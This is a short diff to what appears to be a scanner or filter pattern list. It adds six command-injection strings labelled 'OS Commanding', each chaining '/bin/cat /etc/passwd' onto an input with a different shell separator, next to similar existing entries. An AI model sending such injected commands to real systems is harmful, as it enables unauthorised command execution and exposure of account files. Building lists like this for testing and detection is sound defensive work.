@@ -19,3 +19,10 @@
 blah | uname -a;:::OS Commanding
 blah | /bin/cat /etc/passwd;:::OS Commanding
 blah | sudo /bin/cat /etc/passwd;:::OS Commanding
+blah | /bin/cat /etc/passwd;:::OS Commanding
+blah || /bin/cat /etc/passwd;:::OS Commanding
+blah ; /bin/cat /etc/passwd;:::OS Commanding
+blah ;; /bin/cat /etc/passwd;:::OS Commanding
+blah && /bin/cat /etc/passwd;:::OS Commanding
+blah &  /bin/cat /etc/passwd;:::OS Commanding
+
